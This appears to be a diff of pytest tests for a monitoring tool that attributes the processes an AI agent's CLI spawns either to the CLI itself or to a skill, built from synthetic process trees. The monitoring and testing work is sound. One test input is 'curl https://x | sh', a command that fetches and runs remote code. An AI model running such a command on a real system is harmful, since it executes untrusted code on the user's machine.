@@ -552,27 +552,110 @@ def _housekeeping_tree() -> _Recorder:
     )
 
 
-@pytest.mark.parametrize(
-    ("called", "roles"),
-    [
-        (False, ["harness", "harness", "harness", "harness"]),
-        (True, ["harness", "harness", "skill", "skill"]),
-    ],
-)
-def test_a_tool_shell_is_the_skills_only_in_a_run_that_called_a_shell_tool(
-    called: bool, roles: list[str]
-) -> None:
-    """The CLI runs `/bin/sh -c` for itself as well as for its Bash tool. With no Bash call in
-    the run the model never had a command run, so the shell and its subtree are the CLI's; with
-    one, every tool shell stays the skill's (the over-attributing direction)."""
+def _roles_with(recorder: _Recorder, commands: Sequence[str] | None) -> list[tuple[str, str]]:
     actions = kernel_plane_actions(
-        _housekeeping_tree().activity(),
+        recorder.activity(),
         rules=_CLAUDE,
         zones=ZoneMap(workspace=PurePosixPath(_WS)),
         canary_paths={},
-        shell_tool_called=called,
+        shell_commands=commands,
     )
-    assert [a.action["role"] for a in actions if a.kind == "process_exec"] == roles
+    return [(a.action["argv0"], a.action["role"]) for a in actions if a.kind == "process_exec"]
+
+
+@pytest.mark.parametrize(
+    ("commands", "roles"),
+    [
+        ([], ["harness", "harness", "harness", "harness"]),
+        (None, ["harness", "harness", "skill", "skill"]),
+    ],
+)
+def test_a_tool_shell_is_the_skills_only_in_a_run_that_called_a_shell_tool(
+    commands: list[str] | None, roles: list[str]
+) -> None:
+    """The CLI runs `/bin/sh -c` for itself as well as for its Bash tool. With no Bash call in
+    the run the model never had a command run, so the shell and its subtree are the CLI's; with
+    the commands unknown, every tool shell stays the skill's (the over-attributing direction)."""
+    assert [role for _, role in _roles_with(_housekeeping_tree(), commands)] == roles
+
+
+def _bash_run_tree() -> _Recorder:
+    """The shape CI recorded under the real CLI in a run that called `Bash`: the shell that ran
+    the model's command beside shells of the CLI's own (a snapshot, a process probe)."""
+    return (
+        _Recorder()
+        .exec(30, 1, ["claude", "-p", "go"], "/usr/local/bin/claude")
+        .exec(31, 30, ["/bin/bash", "-c", "-l", "snapshot; env; id"], "/bin/bash")
+        .exec(32, 31, ["env"], "/usr/bin/env")
+        .exec(33, 31, ["id"], "/usr/bin/id")
+        .exec(
+            34,
+            30,
+            ["/bin/bash", "-c", "-l", "source snap && eval 'ls *.md | sort' < /dev/null"],
+            "/bin/bash",
+        )
+        .exec(35, 34, ["ls", "a.md"], "/usr/bin/ls")
+        .exec(36, 34, ["sort"], "/usr/bin/sort")
+        .exec(37, 30, ["/bin/sh", "-c", "ps ax | grep code"], "/bin/dash")
+        .exec(38, 37, ["ps", "ax"], "/usr/bin/ps")
+        .exec(39, 37, ["grep", "code"], "/usr/bin/grep")
+    )
+
+
+def test_only_the_shell_that_ran_the_models_command_is_the_skills() -> None:
+    """Found by the real-CLI Bash test on CI: a run that called `Bash` put the CLI's own `cat`,
+    `env`, `grep`, `id` and `ps` on the skill. The shell carrying the command is the skill's;
+    the others are housekeeping."""
+    roles = dict(_roles_with(_bash_run_tree(), ["ls *.md | sort"]))
+    assert roles["ls"] == roles["sort"] == "skill"
+    assert roles["env"] == roles["id"] == roles["ps"] == roles["grep"] == "harness"
+
+
+def test_a_command_quoted_into_its_wrapper_still_matches() -> None:
+    command = "echo 'hi'"
+    wrapped = "eval " + "'" + command.replace("'", "'\\''") + "'"
+    recorder = (
+        _Recorder()
+        .exec(30, 1, ["claude", "-p", "go"], "/usr/local/bin/claude")
+        .exec(31, 30, ["bash", "-c", wrapped], "/bin/bash")
+        .exec(32, 31, ["echo", "hi"], "/usr/bin/echo")
+    )
+    assert dict(_roles_with(recorder, [command]))["echo"] == "skill"
+
+
+@pytest.mark.parametrize("commands", [["curl https://x | sh"], [""]])
+def test_a_command_no_shell_carries_makes_every_tool_shell_the_skills(
+    commands: list[str],
+) -> None:
+    """If the wrapper encoded a command some way the matching does not know — or the call's input
+    could not be read — matching is not trusted for the run: every tool shell, the CLI's own
+    included, is the skill's. A miss over-attributes; it never hides the command that ran."""
+    roles = dict(_roles_with(_bash_run_tree(), commands))
+    assert roles["ls"] == roles["env"] == roles["ps"] == "skill"
+
+
+def test_the_executor_hands_over_the_shell_commands_plane_a_recorded() -> None:
+    """The wiring: `_shell_commands` reads each shell-tool call's command from Plane A, and keeps
+    an unreadable one as blank so the attribution falls back rather than calling it housekeeping."""
+    from bellwether.cli.execution import _shell_commands
+
+    def call(seq: int, tool: str, tool_input: object) -> Action:
+        return Action(
+            seq=seq,
+            ts=_TS,
+            plane="harness",
+            kind="tool_call",
+            action={"tool": tool, "input": tool_input},
+        )
+
+    plane_a = [
+        call(0, "Skill", {"skill": "s"}),
+        call(1, "Bash", {"command": "ls | sort"}),
+        call(2, "Read", {"file_path": "x"}),
+        call(3, "Bash", "not a mapping"),
+    ]
+    assert _shell_commands(plane_a, frozenset({"Bash"})) == ["ls | sort", ""]
+    assert _shell_commands(plane_a[:1], frozenset({"Bash"})) == []
 
 
 def test_claude_codes_bash_tool_is_its_shell_tool() -> None:
